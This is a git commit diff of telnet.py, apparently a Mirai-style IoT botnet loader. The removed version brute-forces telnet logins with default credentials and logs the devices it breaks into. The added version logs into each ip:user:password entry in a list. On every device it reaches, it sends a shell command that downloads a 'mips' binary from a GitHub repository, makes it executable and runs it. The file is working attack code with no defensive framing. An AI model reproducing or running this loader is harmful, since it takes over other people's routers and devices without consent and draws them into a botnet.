22e7a214fa7f3bc2c7ba35b12d67a8ce4bc4a3ae
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-19 13:55:41 +0500

    Update telnet.py

--- telnet.py
+++ telnet.py
@@ -1,136 +1,79 @@
-import threading
-import sys, os, re, time, socket
-from queue import Queue
-from sys import stdout
+#!/usr/bin/python
+# Simple Telnet Loader Modified by Deeznuts? 
+# You Can Find Fresh TELNET List To Load @ http://godz56.tk/telnet-list/
+# Modified with more tweaks.
 
-# Ensure correct usage of the script
-if len(sys.argv) < 4:
-    print("Usage: python3 " + sys.argv[0] + " <list> <threads> <output file>")
-    sys.exit()
+import sys, re, os, socket, time
+from threading import Thread
 
-# Credentials for brute-forcing
-combo = ["admin:admin"]
+if len(sys.argv) < 2:
+	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
 
-# Read IP addresses from the input file
-ips = open(sys.argv[1], "r").readlines()
-threads = int(sys.argv[2])
-output_file = sys.argv[3]
-queue = Queue()
-queue_count = 0
+cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips" #command to send
+info = open(str(sys.argv[1]),'a+')
 
-# Add IPs to the queue
-for ip in ips:
-    queue_count += 1
-    stdout.write("\r[%d] Added to queue" % queue_count)
-    stdout.flush()
-    queue.put(ip.strip())  # Ensure no extra newlines
-print("\n")
+def sqwad(ip,username,password):
+	ip = str(ip).rstrip("\n")
+	username = username.rstrip("\n")
+	password = password.rstrip("\n")
+	try:
+		tn = socket.socket()
+		tn.settimeout(5)
+		tn.connect((ip,23))
+	except Exception:
+		print "\033[32m[\033[31m+\033[32m] \033[31mFailed To Connect!\033[37m %s"%(ip)
+		tn.close()
+	try:
+		hoho = ''
+		hoho += readUntil(tn, "ogin")
+		if "ogin" in hoho:
+			tn.send(username + "\n")
+			print "\033[32m[\033[31m+\033[32m] \033[35mSending Username!\033[37m %s"%(ip)
+			time.sleep(0.09)
+		else:
+			pass
+	except Exception:
+		tn.close()
+	try:
+		hoho = ''
+		hoho += readUntil(tn, "assword:")
+		if "assword" in hoho:
+			tn.send(password + "\n")
+			print "\033[32m[\033[33m+\033[32m] \033[36mSending Password!\033[37m %s"%(ip)
+			time.sleep(2)
+		else:
+			pass
+	except Exception:
+		tn.close()
+	try:
+		tn.send("sh" + "\n")
+		time.sleep(0.05)
+		tn.send(cmd + "\n")
+		print "\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s"%(ip) #False possitives because thats what yall wanted lmao
+		time.sleep(15)
+		tn.close()
+	except Exception:
+		tn.close()
 
-class router(threading.Thread):
-    def __init__(self, ip):
-        threading.Thread.__init__(self)
-        self.ip = str(ip).rstrip('\n')
-        self.rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"
+def readUntil(tn, string, timeout=8):
+	buf = ''
+	start_time = time.time()
+	while time.time() - start_time < timeout:
+		buf += tn.recv(1024)
+		time.sleep(0.01)
+		if string in buf: return buf
+	raise Exception('TIMEOUT!')
 
-    def run(self):
-        global fh
-        username = ""
-        password = ""
-        for passwd in combo:
-            if ":n/a" in passwd:
-                password = ""
-            else:
-                password = passwd.split(":")[1]
-            if "n/a:" in passwd:
-                username = ""
-            else:
-                username = passwd.split(":")[0]
-            
-            try:
-                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                tn.settimeout(0.37)
-                tn.connect((self.ip, 23))
-            except Exception:
-                tn.close()
-                break
-            
-            try:
-                hoho = ''
-                hoho += readUntil(tn, ":")
-                if ":" in hoho:
-                    tn.send((username + "\r\n").encode())
-                    time.sleep(0.1)
-            except Exception:
-                tn.close()
-
-            try:
-                hoho = ''
-                hoho += readUntil(tn, ":")
-                if ":" in hoho:
-                    tn.send((password + "\r\n").encode())
-                    time.sleep(0.1)
-                else:
-                    pass
-            except Exception:
-                tn.close()
-
-            try:
-                prompt = tn.recv(40960).decode('utf-8', 'ignore')
-                success = False
-                if "#" in prompt or "$" in prompt:
-                    success = True
-                else:
-                    tn.close()
-
-                if success:
-                    try:
-                        tn.send((self.rekdevice + "\r\n").encode())
-                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
-                        fh.flush()
-                        print(f"[+] GOTCHA -> {username}:{password}:{self.ip}")
-                        tn.close()
-                        break
-                    except:
-                        tn.close()
-                else:
-                    tn.close()
-            except Exception:
-                tn.close()
-
-# Helper function to read until a certain string is received
-def readUntil(tn, string, timeout=6):
-    buf = ''
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-        buf += tn.recv(1024).decode('utf-8', 'ignore')
-        time.sleep(0.01)
-        if string in buf: 
-            return buf
-    raise Exception('TIMEOUT!')
-
-# Worker function to handle multiple threads
-def worker():
-    try:
-        while True:
-            try:
-                IP = queue.get()
-                thread = router(IP)
-                thread.start()
-                queue.task_done()
-                time.sleep(0.02)
-            except:
-                pass
-    except:
-        pass
-
-# Open the output file for writing
-global fh
-fh = open("workingtelnet.txt", "a")
-
-# Start the worker threads
-for _ in range(threads):
-    try:
-        t = threading.Thread(target=worker)
-        t.start()
-    except:
-        pass
+for x in info:
+	try:
+		if ":23 " in x:
+			x = x.replace(":23 ", ":")
+		xinfo = x.split(":")
+		session = Thread(target=sqwad, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
+		session.start()
+		ip=xinfo[0]
+		username=xinfo[1]
+		password=xinfo[2]
+		time.sleep(0.01)
+	except:
+		pass
